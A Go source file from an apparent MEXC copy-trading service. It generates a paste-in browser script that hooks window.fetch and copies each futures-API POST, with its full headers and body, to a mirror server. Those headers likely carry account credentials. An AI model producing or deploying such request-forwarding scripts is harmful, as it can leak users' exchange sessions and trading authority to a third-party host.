package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"log/slog"
	"net/http"
	"sync"
	"tg_mexc/internal/middleware"
	"time"
)

// MirrorRequest - данные перехваченного запроса
type MirrorRequest struct {
	URL          string `json:"url"`
	Method       string `json:"method"`
	Headers      any    `json:"headers"`
	RequestBody  any    `json:"requestBody"`
	ResponseData any    `json:"responseData"`
	Timestamp    int64  `json:"timestamp"`
}

// MirrorToken - токен для идентификации пользователя
type MirrorToken struct {
	Token     string
	UserID    int
	Username  string
	CreatedAt time.Time
}

// MirrorManager управляет mirror токенами и сессиями
type MirrorManager struct {
	tokens map[string]*MirrorToken // token -> MirrorToken
	mu     sync.RWMutex
	logger *slog.Logger
}

// NewMirrorManager создает новый менеджер
func NewMirrorManager(logger *slog.Logger) *MirrorManager {
	return &MirrorManager{
		tokens: make(map[string]*MirrorToken),
		logger: logger,
	}
}

// GenerateToken создает новый токен для пользователя
func (m *MirrorManager) GenerateToken(userID int, username string) string {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Удаляем старый токен если есть
	for token, mt := range m.tokens {
		if mt.UserID == userID {
			delete(m.tokens, token)
			break
		}
	}

	// Генерируем новый токен
	bytes := make([]byte, 16)
	rand.Read(bytes)
	token := hex.EncodeToString(bytes)

	m.tokens[token] = &MirrorToken{
		Token:     token,
		UserID:    userID,
		Username:  username,
		CreatedAt: time.Now(),
	}

	return token
}

// ValidateToken проверяет токен и возвращает данные пользователя
func (m *MirrorManager) ValidateToken(token string) (*MirrorToken, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	mt, ok := m.tokens[token]

	return mt, ok
}

// HandleMirrorReceive принимает перехваченные запросы
func (h *Handler) HandleMirrorReceive(w http.ResponseWriter, r *http.Request) {
	// Получаем токен из header
	token := r.Header.Get("X-Mirror-Token")
	if token == "" {
		h.respondError(w, http.StatusUnauthorized, "Missing token")
		return
	}

	// Валидируем токен
	mirrorToken, ok := h.mirrorManager.ValidateToken(token)
	if !ok {
		h.respondError(w, http.StatusUnauthorized, "Invalid token")
		return
	}

	// Парсим тело запроса
	var req MirrorRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		h.respondError(w, http.StatusBadRequest, "Invalid request body")
		return
	}

	// Логируем перехваченный запрос
	h.logger.Info("🔵 Mirror request received",
		slog.String("user", mirrorToken.Username),
		slog.Int("user_id", mirrorToken.UserID),
		slog.String("url", req.URL),
		slog.String("method", req.Method),
		slog.Any("request_body", req.RequestBody),
		slog.Any("response_data", req.ResponseData),
	)

	// Здесь в будущем будет логика copy trading
	// TODO: Парсинг запросов и выполнение copy trading

	h.respondSuccess(w, "OK", nil)
}

// HandleGetMirrorScript возвращает JS код с токеном пользователя
func (h *Handler) HandleGetMirrorScript(w http.ResponseWriter, r *http.Request) {
	userID, _ := h.getUserFromContext(r)
	username, _ := h.getUsernameFromContext(r)

	// Генерируем токен для пользователя
	token := h.mirrorManager.GenerateToken(userID, username)

	script := generateMirrorScript(h.mirrorURL, token)

	h.respondSuccess(w, "", map[string]string{
		"script":     script,
		"token":      token,
		"mirror_url": h.mirrorURL,
	})
}

func (h *Handler) getUserFromContext(r *http.Request) (int, bool) {
	return middleware.GetUserID(r.Context())
}

func (h *Handler) getUsernameFromContext(r *http.Request) (string, bool) {
	return middleware.GetUsername(r.Context())
}

func generateMirrorScript(mirrorURL, token string) string {
	return `(function() {
    const MIRROR_BASE_URL = '` + mirrorURL + `';
    const MIRROR_TOKEN = '` + token + `';

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    const c = iframe.contentWindow.console;

    const originalFetch = window.fetch;

    window.fetch = async function(...args) {
        const url = args[0] instanceof Request ? args[0].url : args[0];

        if (!url.includes('mexc.com/api/platform/futures/api/v1/')) {
            return originalFetch.apply(this, args);
        }

        const options = args[1] || {};
        const method = options.method || 'GET';

        // Только POST запросы отправляем на mirror
        if (method !== 'POST') {
            return originalFetch.apply(this, args);
        }

        // Извлекаем path и query из оригинального URL
        const urlObj = new URL(url);
        const pathAndQuery = urlObj.pathname + urlObj.search;
        const mirrorFullURL = MIRROR_BASE_URL + pathAndQuery;

        // Отправляем оригинальный и mirror запросы одновременно
        const mirrorHeaders = { ...options.headers, 'X-Mirror-Token': MIRROR_TOKEN };
        const [response] = await Promise.all([
            originalFetch.apply(this, args),
            originalFetch(mirrorFullURL, {
                method: 'POST',
                headers: mirrorHeaders,
                body: options.body || null
            }).catch(err => c.warn('Mirror error:', err))
        ]);

        let requestBody = null;
        if (options.body) {
            try { requestBody = JSON.parse(options.body); } catch { requestBody = options.body; }
        }

        const clone = response.clone();
        let responseData = null;
        try { responseData = await clone.json(); } catch { responseData = await clone.text(); }

        c.group('🔵 ' + url);
        c.log('Method:', method);
        c.log('Request Body:', requestBody);
        c.log('Response:', responseData);
        c.log('Mirror URL:', mirrorFullURL);
        c.groupEnd();

        return response;
    };

    c.log('✅ MEXC Mirror interceptor ready (POST only)');
    c.log('📡 Mirror base:', MIRROR_BASE_URL);
})();`
}
